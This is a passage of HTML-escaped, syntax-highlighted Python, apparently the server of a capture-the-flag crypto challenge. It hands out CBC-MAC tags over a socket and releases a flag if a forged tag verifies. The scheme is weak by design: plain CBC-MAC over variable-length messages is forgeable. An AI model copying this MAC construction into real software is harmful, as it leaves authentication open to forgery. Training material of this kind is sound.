&lt;&#x2F;span&gt;&lt;span&gt;    conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(INITIAL&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;    key &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;Random&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;get_random_bytes&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;16&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;    queries &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;[]
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;while &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(queries) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;lt; &lt;&#x2F;span&gt;&lt;span&gt;MAX_QUERIES:
&lt;&#x2F;span&gt;&lt;span&gt;        conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(MENU&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recv&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1024&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;ConnectionResetError &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;cre:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;return
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# MAC QUERY
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;1&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;msg (hex): &amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;            msg &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recv&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1024&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                msg &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;unhexlify&lt;&#x2F;span&gt;&lt;span&gt;(msg)
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(msg) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;BS) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;BS &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                    conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Invalid msg length. Must be a multiple of BS=&lt;&#x2F;span&gt;&lt;span&gt;{BS}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                    queries&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;append&lt;&#x2F;span&gt;&lt;span&gt;(msg)
&lt;&#x2F;span&gt;&lt;span&gt;                    t &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;cbc_mac&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;key)
&lt;&#x2F;span&gt;&lt;span&gt;                    conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;CBC-MAC(msg): &lt;&#x2F;span&gt;&lt;span&gt;{t&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;decode&lt;&#x2F;span&gt;&lt;span&gt;()}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Exception &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;e:
&lt;&#x2F;span&gt;&lt;span&gt;                conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Invalid msg format. Must be in hexadecimal&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# FORGERY (impossible as I&amp;#39;m told)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;2&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;msg (hex): &amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;            msg &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recv&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1024&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;            conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;tag (hex): &amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;            tag &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span&gt;conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;recv&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;1024&lt;&#x2F;span&gt;&lt;span&gt;)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;strip&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;try&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                msg &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;unhexlify&lt;&#x2F;span&gt;&lt;span&gt;(msg)
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(msg) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span&gt;BS) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;% &lt;&#x2F;span&gt;&lt;span&gt;BS &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;0&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                    conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Invalid msg length. Must be a multiple of BS=&lt;&#x2F;span&gt;&lt;span&gt;{BS}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; bytes&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(tag) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;!= &lt;&#x2F;span&gt;&lt;span&gt;BS&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;*&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ff8f40;&quot;&gt;2&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                    conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Invalid tag length. Must be &lt;&#x2F;span&gt;&lt;span&gt;{BS}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt; bytes&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;elif &lt;&#x2F;span&gt;&lt;span&gt;msg &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;in &lt;&#x2F;span&gt;&lt;span&gt;queries:
&lt;&#x2F;span&gt;&lt;span&gt;                    conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;cheater&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;                &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                    t_ret &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;= &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;cbc_mac&lt;&#x2F;span&gt;&lt;span&gt;(msg&lt;&#x2F;span&gt;&lt;span style=&quot;color:#61676ccc;&quot;&gt;, &lt;&#x2F;span&gt;&lt;span&gt;key)
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;t_ret &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;tag:
&lt;&#x2F;span&gt;&lt;span&gt;                        conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;If you reach this point, I guess we need to find a better MAC (and not trust TR). &lt;&#x2F;span&gt;&lt;span&gt;{FLAG}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;                    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;                        conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;str&lt;&#x2F;span&gt;&lt;span&gt;(t_ret &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span&gt;tag)&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;() &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;+ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;except &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#55b4d4;&quot;&gt;Exception &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;as &lt;&#x2F;span&gt;&lt;span&gt;e:
&lt;&#x2F;span&gt;&lt;span&gt;                conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;Invalid msg format. Must be in hexadecimal&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;:
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;choice &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;3&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# EXIT
&lt;&#x2F;span&gt;&lt;span&gt;                conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;bye&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;else&lt;&#x2F;span&gt;&lt;span&gt;: &lt;&#x2F;span&gt;&lt;span style=&quot;font-style:italic;color:#abb0b6;&quot;&gt;# INVALID CHOICE
&lt;&#x2F;span&gt;&lt;span&gt;                conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;b&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;invalid menu choice&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;)
&lt;&#x2F;span&gt;&lt;span&gt;            &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;break
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(queries) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;&amp;gt; &lt;&#x2F;span&gt;&lt;span&gt;MAX_QUERIES:
&lt;&#x2F;span&gt;&lt;span&gt;        conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;sendall&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;f&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;too many queries: &lt;&#x2F;span&gt;&lt;span&gt;{&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f07171;&quot;&gt;len&lt;&#x2F;span&gt;&lt;span&gt;(queries)}&lt;&#x2F;span&gt;&lt;span style=&quot;color:#4cbf99;&quot;&gt;\n&lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;encode&lt;&#x2F;span&gt;&lt;span&gt;())
&lt;&#x2F;span&gt;&lt;span&gt;    conn&lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#f29718;&quot;&gt;close&lt;&#x2F;span&gt;&lt;span&gt;()
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#fa6e32;&quot;&gt;if &lt;&#x2F;span&gt;&lt;span&gt;__name__ &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ed9366;&quot;&gt;== &lt;&#x2F;span&gt;&lt;span style=&quot;color:#86b300;&quot;&gt;&amp;quot;__main__&amp;quot;&lt;&#x2F;span&gt;&lt;span&gt;:
